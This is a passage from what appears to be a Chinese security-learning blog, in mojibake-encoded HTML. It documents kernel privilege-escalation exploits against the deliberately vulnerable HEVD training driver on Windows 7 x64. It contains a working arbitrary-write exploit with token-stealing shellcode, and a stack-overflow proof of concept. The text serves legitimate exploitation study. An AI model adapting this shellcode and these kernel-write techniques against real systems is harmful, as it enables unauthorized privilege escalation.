class="hljs-string">&quot;[!] NtQuerySystemInformation Failed, NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    <span class="hljs-keyword">default</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Module Count: &quot;</span> &lt;&lt; PModuleInfo-&gt;ModulesCount &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    INT32 i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (i &lt; PModuleInfo-&gt;ModulesCount)    &#123;        SYSTEM_MODULE CurrentSM = PModuleInfo-&gt;Modules[i];        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Log System Module:&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Reserved1 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Reserved1 &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Reserved2 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Reserved2 &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- ImageBaseAddress 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.ImageBaseAddress &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- ImageSize 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.ImageSize &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Flags 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Flags &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Id 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Id &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Rank 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Rank &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- LoadCount 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.LoadCount &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- NameOffset 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.NameOffset &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Name &quot;</span> &lt;&lt; CurrentSM.Name &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(CurrentSM.Name, <span class="hljs-string">&quot;ntoskrnl&quot;</span>) || <span class="hljs-built_in">strstr</span>(CurrentSM.Name, <span class="hljs-string">&quot;ntkrnl&quot;</span>))        &#123;            <span class="hljs-keyword">return</span> CurrentSM;        &#125;        i += <span class="hljs-number">1</span>;    &#125;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Can not find&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);&#125;<span class="hljs-function">ULONG64 <span class="hljs-title">GetHalDispatchTableAddress</span><span class="hljs-params">(SYSTEM_MODULE SM)</span></span><span class="hljs-function"></span>&#123;    CHAR NtName[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;    <span class="hljs-built_in">strncpy</span>(NtName, <span class="hljs-built_in">strrchr</span>(SM.Name, <span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">1</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">strrchr</span>(SM.Name, <span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">1</span>));    HMODULE hNtkrnl = LoadLibraryA(NtName);    <span class="hljs-keyword">if</span> (hNtkrnl == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Open &quot;</span> &lt;&lt; NtName &lt;&lt; <span class="hljs-string">&quot; Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    ULONG64 userlandHal = (ULONG64)GetProcAddress(hNtkrnl, <span class="hljs-string">&quot;HalDispatchTable&quot;</span>);    ULONG64 kernelHal = userlandHal - (ULONG64)hNtkrnl + SM.ImageBaseAddress;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] HalDispatchTable: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; kernelHal &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    <span class="hljs-comment">/*</span><span class="hljs-comment">    HalDispatchTable:</span><span class="hljs-comment">    1: kd&gt; dq 0xfffff80003fe2cf0</span><span class="hljs-comment">    fffff800`03fe2cf0  00000000`00000004 fffff800`044148e8</span><span class="hljs-comment">    fffff800`03fe2d00  fffff800`04415470 fffff800`041aa8a0</span><span class="hljs-comment"></span><span class="hljs-comment">    1: kd&gt; uf fffff800`044148e8</span><span class="hljs-comment">    hal!HaliQuerySystemInformation:</span><span class="hljs-comment">    fffff800`044148e8 fff3            push    rbx</span><span class="hljs-comment">    fffff800`044148ea 55              push    rbp</span><span class="hljs-comment">    fffff800`044148eb 56              push    rsi</span><span class="hljs-comment">    fffff800`044148ec 57              push    rdi</span><span class="hljs-comment">    fffff800`044148ed 4154            push    r12</span><span class="hljs-comment">    */</span>    <span class="hljs-keyword">return</span> kernelHal;&#125;<span class="hljs-function">VOID <span class="hljs-title">TriggerShellcode</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">/*</span><span class="hljs-comment">    0: kd&gt; uf NtQueryIntervalProfile</span><span class="hljs-comment">    ntdll!NtQueryIntervalProfile:</span><span class="hljs-comment">    00000000`77b7aa80 4c8bd1          mov     r10,rcx</span><span class="hljs-comment">    00000000`77b7aa83 b81d010000      mov     eax,11Dh</span><span class="hljs-comment">    00000000`77b7aa88 0f05            syscall</span><span class="hljs-comment">    00000000`77b7aa8a c3              ret</span><span class="hljs-comment">    0: kd&gt; uf nt!NtQueryIntervalProfile</span><span class="hljs-comment">    nt!NtQueryIntervalProfile:</span><span class="hljs-comment">    fffff800`041b7940 48895c2408      mov     qword ptr [rsp+8],rbx</span><span class="hljs-comment">    fffff800`041b7945 57              push    rdi</span><span class="hljs-comment">    fffff800`041b7946 4883ec20        sub     rsp,20h</span><span class="hljs-comment">    fffff800`041b794a 488bda          mov     rbx,rdx</span><span class="hljs-comment">    */</span>    HMODULE hNtdll = LoadLibraryA(<span class="hljs-string">&quot;ntdll&quot;</span>);    PNtQueryIntervalProfile NtQueryIntervalProfile = (PNtQueryIntervalProfile)GetProcAddress(hNtdll, <span class="hljs-string">&quot;NtQueryIntervalProfile&quot;</span>);    PULONG null = <span class="hljs-number">0</span>;    NtQueryIntervalProfile(<span class="hljs-number">2</span>, &amp;null);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Open HackSysExtremeVulnerableDriver Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Device Handle: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; dev &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    SYSTEM_MODULE KBSM = GetKernelBaseSystemModule();    ULONG64 HalDispatchTable = GetHalDispatchTableAddress(KBSM);    CHAR shellcode[] =    &#123;        <span class="hljs-comment">// push rax; push rbx; push rcx; push rdx; push rdi; push rsi; push r8; push r9; push r10; push r11; push r12; push r13; push r14; push r15</span>        <span class="hljs-string">&quot;\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57&quot;</span>                <span class="hljs-comment">// change token</span>        <span class="hljs-string">&quot;\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\xba\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00&quot;</span>                <span class="hljs-comment">// pop r15; pop r14; pop r13; pop r12; pop r11; pop r10; pop r9; pop r8; pop rsi; pop rdi; pop rdx; pop rcx; pop rbx; pop rax;</span>        <span class="hljs-string">&quot;\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58&quot;</span>        <span class="hljs-string">&quot;\xc3&quot;</span><span class="hljs-comment">// ret: return to func KeQueryIntervalProfile </span>    &#125;;    LPVOID addr = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] VirtualAlloc failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    RtlCopyMemory(addr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));    ULONG64* ptrShellcode = (ULONG64 *)&amp;addr;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] shecllode addr: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; addr &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    ULONG64 chBuffer[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span> &#125;;    chBuffer[<span class="hljs-number">0</span>] = (ULONG64)ptrShellcode;    chBuffer[<span class="hljs-number">1</span>] = (ULONG64)(HalDispatchTable + <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    DeviceIoControl(dev, <span class="hljs-number">0x22200B</span>, chBuffer, <span class="hljs-number">0x10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    <span class="hljs-comment">/*</span><span class="hljs-comment">    0: kd&gt; dq 0xfffff80003fe2cf0</span><span class="hljs-comment">    fffff800`03fe2cf0  00000000`00000004 00000000`000e0000</span><span class="hljs-comment">    fffff800`03fe2d00  fffff800`04415470 fffff800`041aa8a0</span><span class="hljs-comment">    */</span>    CloseHandle(dev);    TriggerShellcode();    system(<span class="hljs-string">&quot;start cmd&quot;</span>);    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/">https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/</a><br><a href="https://h0mbre.github.io/HEVD_AbitraryWrite_64bit">https://h0mbre.github.io/HEVD_AbitraryWrite_64bit</a><br><a href="https://www.anquanke.com/post/id/246289">https://www.anquanke.com/post/id/246289</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEVD win7 x64 stack overflow</title>
    <link href="/2022/06/25/HEVD%20win7%20x64%20stack%20overflow/"/>
    <url>/2022/06/25/HEVD%20win7%20x64%20stack%20overflow/</url>
    
    <content type="html"><![CDATA[<p>å°è¯•å­¦ç‚¹æ–°ä¸œè¥¿ï¼Œåº”è¯¥ç®—æ˜¯å¾ˆä¹…æ²¡å­¦äº†</p><pre><code class="hljs nsis">ç¯å¢ƒï¼šè™šæ‹Ÿæœºï¼š<span class="hljs-literal">Win7</span> SP1 x64ç‰©ç†æœºï¼š<span class="hljs-literal">Win10</span>debuggerï¼šwindbg previewcompilerï¼švs2022</code></pre><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="VirtualKD-Redux"><a href="#VirtualKD-Redux" class="headerlink" title="VirtualKD-Redux"></a>VirtualKD-Redux</h3><p>çœ‹äº†å¾ˆå¤šåšå®¢ï¼Œä»¥åŠå°è¯•æ­å»ºç¯å¢ƒï¼Œæœ€åå‘ç°è¿˜æ˜¯åˆ«äººå†™çš„è½®å­å¥½ç”¨</p><p><a href="https://github.com/4d61726b/VirtualKD-Redux">VirtualKD-Redux</a></p><p>ä¸‹è½½ä¹‹åï¼Œè§£å‹ï¼ŒæŠŠ<code>target64</code>æ–‡ä»¶å¤¹æ”¾åˆ°è™šæ‹Ÿæœºä¸­ï¼Œç„¶ååœ¨è™šæ‹Ÿæœºè¿è¡Œ<code>vminstall.exe</code>å³å¯</p><p>è¿™ä¸ªå®‰è£…æ‰€åšçš„äº‹æƒ…ï¼Œå¦‚<a href="https://blog.csdn.net/lixiangminghate/article/details/78659646">VirtualKDåŠ é€ŸwindbgåŒæœºè°ƒè¯•é€Ÿåº¦</a>æ‰€è¯´</p><p>ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯æ·»åŠ äº†ä¸€ä¸ª<code>VirtualKD</code>çš„å¯åŠ¨é¡¹</p><p>ä½†æ˜¯ç¬¬äºŒä»¶äº‹æƒ…ï¼Œæˆ‘å¹¶æ²¡æ‰¾åˆ°å­˜åœ¨<code>DDKLaunchMonitor.exe</code>æ–‡ä»¶ä»¥åŠå¯¹æ³¨å†Œè¡¨ä¿®æ”¹çš„è¡Œä¸ºï¼ˆè¿™ä¸ªæ³¨å†Œè¡¨çš„è¡Œä¸ºï¼Œå¯ä»¥çœ‹åˆ°è€ç‰ˆæœ¬çš„è¿™ä¸ªè½®å­ï¼Œå­˜åœ¨<code>kdpatch.reg</code>ï¼‰ï¼Œä½†æ˜¯æˆ‘å‘ç°<code>kdbazis.dll</code>è¯¥æ–‡ä»¶è¢«æ”¾åˆ°äº†<code>C:\Windows\System32</code>ç›®å½•ä¸‹ï¼ŒæŸ¥é˜…äº†ä¸€äº›èµ„æ–™ï¼Œæåˆ°<code>kdbazis.dll</code>æ˜¯ç”±<code>kdvm.dll</code>é‡å‘½åè€Œæ¥ï¼ˆé‡å‘½åæ˜¯å› ä¸ºé¿å…<code>win8</code>ä»¥ä¸Šçš„æ“ä½œç³»ç»Ÿæ–‡ä»¶åç§°å†²çªï¼‰ï¼Œå…¶ä½œç”¨å°±æ˜¯ç”¨äºé€šä¿¡ï¼Œæ ¹æ®è¿è¡Œåœ¨ä¸»æœºè¿è¡Œ<code>vmmon64.exe</code>çš„çª—å£çš„<code>log</code>å¯ä»¥çœ‹åˆ°<code>VirtualKD-Redux patcher DLL successfully loaded. Patching the GuestRPC mechanism...</code>ï¼Œé‚£åº”è¯¥å°±æ˜¯å¯¹äº<code>GuestRPC</code>çš„æœºåˆ¶è¿›è¡Œ<code>patch</code>ï¼Œä»è€Œä¾¿äºé€šä¿¡ï¼Œå¹¶ä¸”è¯¥æ¨¡å¼ä¸‹ï¼Œå¯ä»¥åŠ è½½æœªç­¾åçš„é©±åŠ¨ï¼Œå³å°†è¦åŠ è½½çš„<code>HEVD.sys</code></p><p>ä¸»æœºåœ¨<code>win7</code>å¯åŠ¨æ—¶ï¼Œè¿è¡Œ<code>vmmon64</code>è¿›è¡Œç›‘æ§ï¼Œå¹¶å¯åŠ¨<code>Run debugger</code></p><h3 id="OSRLOADER"><a href="#OSRLOADER" class="headerlink" title="OSRLOADER"></a>OSRLOADER</h3><p>åŠ è½½<code>HEVD.sys</code>é©±åŠ¨</p><h3 id="Windbg-Preview"><a href="#Windbg-Preview" class="headerlink" title="Windbg Preview"></a>Windbg Preview</h3><p>éœ€è¦è®¾ç½®ä¸€ä¸‹<code>_NT_SYMBOL_PATH</code>ï¼Œä¸º<code>srv*H:\WinSymbols*https://msdl.microsoft.com/download/symbols;</code></p><p>åœ¨è°ƒè¯•æ—¶ï¼Œå¯ä»¥åŠ è½½<code>HEVD.pdb</code>ä¾¿äºä¸‹æ–­ç‚¹ï¼Œä»¥åŠéœ€è¦åœ¨<code>OSRLOADER</code>ä¸­<code>start service</code>æ‰å¯ä»¥çœ‹åˆ°<code>HEVD</code>é©±åŠ¨</p><p>åˆ©ç”¨<code>lm m h*</code>æŒ‡ä»¤å°±å¯ä»¥çœ‹åˆ°<code>HEVD</code>æ˜¯å¦åŠ è½½äº†</p><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>å¯ä»¥é€šè¿‡<code>lm m HEVD</code>çœ‹<code>HEVD</code>æ¨¡å—çš„åŸºç¡€ä¿¡æ¯ï¼Œé€šè¿‡<code>!drvobj HEVD 2</code>æŸ¥çœ‹è¯¥é©±åŠ¨çš„è¯¦ç»†çš„ä¿¡æ¯</p><p>åœ¨<code>IrpDeviceIoCtlHandler()</code>æ¥å£å¯ä»¥çœ‹åˆ°å„ç§<code>ioctlhandler</code>ï¼Œå…¶ä¸­æ ˆæº¢å‡ºä¸º<code>0x222003</code></p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x222003</span>:    DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>);    FakeObjectNonPagedPoolNxIoctlHandler = BufferOverflowStackIoctlHandler(Irp, CurrentStackLocation);    v7 = <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;    <span class="hljs-keyword">goto</span> LABEL_62;</code></pre><p>æ¼æ´ç‚¹ååˆ†ç®€å•ï¼Œå°±æ˜¯è£¸æº¢å‡º</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">BufferOverflowStackIoctlHandler</span><span class="hljs-params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span><span class="hljs-function"></span>&#123;  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="hljs-comment">// rcx</span>  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int64 Options; <span class="hljs-comment">// rdx</span>  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;  result = <span class="hljs-number">0xC0000001</span>i64;  Options = IrpSp-&gt;Parameters.Create.Options;  <span class="hljs-keyword">if</span> ( Parameters )    <span class="hljs-keyword">return</span> TriggerBufferOverflowStack(Parameters, Options);  <span class="hljs-keyword">return</span> result;&#125;</code></pre><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">TriggerBufferOverflowStack</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *UserBuffer, <span class="hljs-keyword">unsigned</span> __int64 Size)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">2048</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-818h] BYREF</span>  <span class="hljs-built_in">memset</span>(v5, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v5));  ProbeForRead(UserBuffer, <span class="hljs-number">0x800</span>ui64, <span class="hljs-number">1u</span>);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, v5);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="hljs-number">0x800</span>i64);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);  memmove(v5, UserBuffer, Size);                <span class="hljs-comment">// stack overflow</span>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>å› æ­¤è¾“å…¥å­—ç¬¦ä¸²è¦†ç›–åˆ°<code>ret</code>å³å¯è§¦å‘æ¼æ´</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Device Handle: 0x%p\n&quot;</span>, dev);    CHAR* chBuffer;    <span class="hljs-keyword">int</span> chBufferLen = <span class="hljs-number">0x818</span>;        chBuffer = (CHAR*)<span class="hljs-built_in">malloc</span>(chBufferLen + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer, <span class="hljs-number">0xff</span>, chBufferLen);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    BOOL is_ok = DeviceIoControl(dev, <span class="hljs-number">0x222003</span>, chBuffer, chBufferLen + <span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    CloseHandle(dev);    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>é¦–å…ˆæ‰“å¼€è¿™ä¸ªè®¾å¤‡ï¼Œç„¶åäºè¿™ä¸ªè®¾å¤‡è¿›è¡Œäº¤äº’ï¼Œé€šè¿‡è°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°æœ€å<code>ret</code>çš„æ—¶å€™ï¼Œ<code>rip</code>è·³è½¬åˆ°äº†<code>0x4141414141414141</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ç°åœ¨è¦åšçš„å°±æ˜¯ææƒä¹‹åå†æ‰“å¼€ä¸€ä¸ª<code>cmd</code></p><p>ç›®å‰ç¬¬ä¸€ä¸ªæ ˆæº¢å‡ºçš„å®éªŒï¼Œæ˜¯æ²¡å¼€<code>SMEP</code>ï¼Œå› æ­¤å¯ä»¥ç›´æ¥è·³è½¬åˆ°ç”¨æˆ·æ€çš„ç©ºé—´æ‰§è¡ŒæŒ‡ä»¤ï¼Œå°±å¯ä»¥ç›´æ¥<code>VirtualAlloc</code>ä¸€ä¸ªå¯è¯»å¯å†™å¯æ‰§è¡Œçš„é¡µï¼Œä»è€Œç›´æ¥æ‰§è¡Œææƒçš„æŒ‡ä»¤</p><p>è¿™é‡Œæ˜¯ç›´æ¥å‚è€ƒ<a href="https://www.abatchy.com/2018/01/kernel-exploitation-2">[Kernel Exploitation] 2: Payloads</a>çš„æ–¹æ³•ï¼Œçªƒå–çš„è¿›ç¨‹çº§ä»¤ç‰Œ</p><p>æ¯ä¸ª<code>windows</code>è¿›ç¨‹éƒ½æœ‰ä¸€ä¸ª<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm">EPROCESS</a>ç»“æ„ä½“ï¼ˆ<code>PEB</code>å­˜åœ¨äºç”¨æˆ·ç©ºé—´ï¼‰ï¼Œè€Œè¿™ä¸ª<code>EPROCESS</code>ç»“æ„åŒ…å«ä¸€ä¸ª<code>Token</code>å­—æ®µï¼Œè¿™ä¸ªå­—æ®µå‘Šè¯‰ç³»ç»Ÿè¯¥è¿›ç¨‹æ‹¥æœ‰ä»€ä¹ˆæƒé™ï¼Œå› 